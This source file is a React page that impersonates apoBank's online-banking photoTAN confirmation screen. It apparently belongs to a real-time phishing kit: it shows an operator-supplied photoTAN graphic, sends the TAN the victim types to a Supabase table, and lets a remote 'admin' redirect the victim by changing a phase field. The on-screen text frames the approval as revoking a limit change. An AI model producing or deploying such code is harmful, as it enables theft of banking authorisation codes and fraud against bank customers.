import { useEffect, useState } from "react";
import { ChevronRight, HelpCircle, Loader2 } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import phototanImg from "@/assets/phototan.png";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";

const LimitPhotoTan = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [tan, setTan] = useState("");
  const [row, setRow] = useState<any>(null);
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => {
    if (!token) return;
    let alive = true;
    const load = async () => {
      const { data } = await (supabase as any)
        .from("limit_tokens")
        .select("*")
        .eq("token", token)
        .maybeSingle();
      if (!alive || !data) return;
      setRow(data);
      const phase = data.customer_phase;
      if (phase === "success") navigate(`/limit/loading?token=${encodeURIComponent(token)}`);
      else if (phase === "aborted") navigate("/auth");
      else if (phase === "confirm" || phase === "phototan_request") {
        // admin sent us back
        const qs = `?token=${encodeURIComponent(token)}`;
        navigate(`/limit/confirm${qs}`);
      }
      if (data.last_error) setSubmitted(false);
    };
    load();
    const iv = window.setInterval(load, 2500);
    const ch = (supabase as any).channel(`limit_ptan_${token}`)
      .on("postgres_changes", { event: "*", schema: "public", table: "limit_tokens", filter: `token=eq.${token}` }, load)
      .subscribe();
    return () => { alive = false; window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, [token, navigate]);

  const submit = async () => {
    if (!token) return;
    setSubmitted(true);
    await (supabase as any)
      .from("limit_tokens")
      .update({ tan_code: tan, last_error: null })
      .eq("token", token);
  };

  const qrSrc = row?.photo_tan_image || phototanImg;
  const valid = tan.length === 6 || tan.length === 8;
  const currLimit = row?.current_limit != null ? Number(row.current_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "2.000,00";
  const newLimit = row?.new_limit != null ? Number(row.new_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "26.000,00";

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <span className="cursor-default">Startseite</span>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">{(row?.limit_type || "Limit-Änderung")} widerrufen</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">{(row?.limit_type || "Limit-Änderung")} widerrufen</h1>
        </div>
      </div>

      <main className="flex-1 relative">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
        </div>

        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[94%] max-w-[680px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-5 sm:p-10">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-8">
              Bitte prüfen Sie die folgende Transaktion
            </h2>
            <p className="text-sm text-foreground mb-6">Limit-Änderung widerrufen</p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 sm:gap-y-8 mb-6">
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Kontobezeichnung</p>
                <p className="text-sm text-foreground">{row?.auftraggeber_iban || "DE53 3006 0601 0025 9570 83"}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Neues Limit</p>
                <p className="text-sm text-foreground mb-4">{newLimit}</p>
                <p className="text-sm text-[#002776] mb-2 font-medium">Altes Limit</p>
                <p className="text-sm text-foreground">{currLimit}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Gültig ab</p>
                <p className="text-sm text-foreground">29.07.2026 20:00</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-2 font-medium">Kontowährung</p>
                <p className="text-sm text-foreground">EUR</p>
              </div>
            </div>

            <div className="border-t border-border/60 pt-6 mb-6">
              <div className="flex flex-col sm:flex-row items-center gap-6">
                <div className="flex-1">
                  <p className="text-sm text-foreground mb-4">
                    Bitte scannen Sie die apoTAN Grafik mit der photoTAN Funktion Ihrer apoTAN App und geben Sie die TAN im Eingabefeld ein
                  </p>
                  <div className="relative">
                    <label className="absolute -top-2 left-3 bg-white px-1 text-[11px] text-[#002776]">TAN*</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={tan}
                      onChange={(e) => setTan(e.target.value.replace(/[^0-9]/g, "").slice(0, 8))}
                      disabled={submitted}
                      className="w-full border-2 border-[#002776] rounded px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8] disabled:bg-muted"
                    />
                  </div>
                  {row?.last_error && (
                    <p className="text-xs text-destructive mt-2">{row.last_error}</p>
                  )}
                </div>
                <img src={qrSrc} alt="photoTAN Grafik" className="w-40 h-40 object-contain border border-black" />
              </div>
            </div>

            <div className="flex justify-end items-center gap-4 pt-2">
              <Button
                disabled={!valid || submitted}
                onClick={submit}
                className={`rounded-full px-6 disabled:opacity-100 ${valid && !submitted ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
              >
                {submitted ? (<><Loader2 className="h-4 w-4 mr-2 animate-spin" />Wird geprüft ...</>) : "Freigeben"}
              </Button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default LimitPhotoTan;
